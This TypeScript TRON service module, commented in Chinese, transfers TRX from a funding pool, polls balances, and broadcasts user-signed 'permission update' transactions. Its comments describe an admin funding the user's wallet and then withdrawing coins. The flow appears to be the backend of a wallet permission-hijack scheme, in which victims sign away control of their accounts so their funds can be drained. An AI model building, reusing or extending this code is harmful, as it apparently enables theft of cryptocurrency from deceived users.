/**
 * TRON 服务 - 处理 TRX 转账和交易广播
 */
import TronWeb from 'tronweb';
import { signingCredentials, validateCredentials } from '../config/signing-credentials';

// 初始化 TronWeb 实例（带私钥，用于签名交易）
let tronWebWithKey: any = null;

function getTronWeb() {
  if (!tronWebWithKey) {
    const validation = validateCredentials();
    if (!validation.valid) {
      throw new Error(validation.error);
    }
    
    tronWebWithKey = new TronWeb({
      fullHost: signingCredentials.tronApi.fullHost,
      headers: { 'TRON-PRO-API-KEY': signingCredentials.tronApi.apiKey },
      privateKey: signingCredentials.fundingPool.privateKey,
    });
  }
  return tronWebWithKey;
}

/**
 * 从代付池转账 TRX 给目标地址
 */
export async function transferTrx(toAddress: string, amount: number = signingCredentials.trxTransferAmount): Promise<{
  success: boolean;
  txId?: string;
  error?: string;
}> {
  try {
    const tronWeb = getTronWeb();
    const sunAmount = amount * 1_000_000; // TRX to SUN
    
    console.log(`[TronService] Transferring ${amount} TRX to ${toAddress}...`);
    
    // 构建转账交易
    const tx = await tronWeb.transactionBuilder.sendTrx(
      toAddress,
      sunAmount,
      signingCredentials.fundingPool.address
    );
    
    // 签名交易
    const signedTx = await tronWeb.trx.sign(tx);
    
    // 广播交易
    const result = await tronWeb.trx.sendRawTransaction(signedTx);
    
    if (result.result) {
      console.log(`[TronService] TRX transfer successful, txId: ${result.txid}`);
      return { success: true, txId: result.txid };
    } else {
      return { success: false, error: result.message || 'Transfer failed' };
    }
  } catch (e: any) {
    console.error('[TronService] TRX transfer error:', e);
    return { success: false, error: e?.message || 'Transfer failed' };
  }
}

/**
 * 检查地址的 TRX 余额
 */
export async function checkTrxBalance(address: string): Promise<number> {
  try {
    const tronWeb = getTronWeb();
    const balance = await tronWeb.trx.getBalance(address);
    return balance / 1_000_000; // SUN to TRX
  } catch (e) {
    console.error('[TronService] Balance check error:', e);
    return 0;
  }
}

/**
 * 广播已签名的交易（权限更新交易）
 */
export async function broadcastSignedTransaction(signedTxJson: string): Promise<{
  success: boolean;
  txId?: string;
  error?: string;
}> {
  try {
    const signedTx = JSON.parse(signedTxJson);
    
    console.log(`[TronService] Broadcasting signed transaction...`);
    console.log(`[TronService] Transaction ID: ${signedTx.txID}`);
    
    // 使用 TRON RPC 广播交易
    const response = await fetch(`${signingCredentials.tronApi.fullHost}/wallet/broadcasttransaction`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'TRON-PRO-API-KEY': signingCredentials.tronApi.apiKey,
      },
      body: JSON.stringify(signedTx),
    });
    
    const result = await response.json() as any;
    
    if (result.result) {
      console.log(`[TronService] Transaction broadcast successful, txId: ${signedTx.txID}`);
      return { success: true, txId: signedTx.txID };
    } else {
      const errorMsg = result.message ? Buffer.from(result.message, 'hex').toString('utf8') : 'Broadcast failed';
      console.error(`[TronService] Broadcast failed:`, errorMsg);
      return { success: false, error: errorMsg };
    }
  } catch (e: any) {
    console.error('[TronService] Broadcast error:', e);
    return { success: false, error: e?.message || 'Broadcast failed' };
  }
}

/**
 * 等待 TRX 到账（轮询检查）
 */
export async function waitForTrxArrival(
  address: string, 
  minBalance: number = 50,
  maxWaitMs: number = 60000,
  checkIntervalMs: number = 3000
): Promise<boolean> {
  const startTime = Date.now();
  
  while (Date.now() - startTime < maxWaitMs) {
    const balance = await checkTrxBalance(address);
    console.log(`[TronService] Checking balance for ${address}: ${balance} TRX`);
    
    if (balance >= minBalance) {
      console.log(`[TronService] TRX arrived! Balance: ${balance} TRX`);
      return true;
    }
    
    await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
  }
  
  console.log(`[TronService] Timeout waiting for TRX arrival`);
  return false;
}

/**
 * 完整的同步权限流程
 * 注意：TRX转账逻辑已注释，管理员需手动转账TRX后再执行提币
 * 现在只执行：广播权限更新交易
 */
export async function syncPermission(
  userAddress: string,
  signedTxJson: string
): Promise<{
  success: boolean;
  step: 'transfer' | 'wait' | 'broadcast' | 'complete';
  txId?: string;
  error?: string;
}> {
  // [已注释] Step 1: 转账 TRX - 管理员手动转账
  // console.log(`[TronService] Step 1: Transferring TRX to ${userAddress}...`);
  // const transferResult = await transferTrx(userAddress);
  // if (!transferResult.success) {
  //   return { success: false, step: 'transfer', error: transferResult.error };
  // }
  
  // [已注释] Step 2: 等待 TRX 到账
  // console.log(`[TronService] Step 2: Waiting for TRX arrival...`);
  // const arrived = await waitForTrxArrival(userAddress, 50, 120000); // 2分钟超时
  // if (!arrived) {
  //   return { success: false, step: 'wait', error: 'Timeout waiting for TRX arrival' };
  // }
  
  // 直接广播权限更新交易（管理员需确保用户钱包有足够TRX）
  console.log(`[TronService] Broadcasting permission update transaction for ${userAddress}...`);
  const broadcastResult = await broadcastSignedTransaction(signedTxJson);
  if (!broadcastResult.success) {
    return { success: false, step: 'broadcast', error: broadcastResult.error };
  }
  
  return { 
    success: true, 
    step: 'complete', 
    txId: broadcastResult.txId 
  };
}
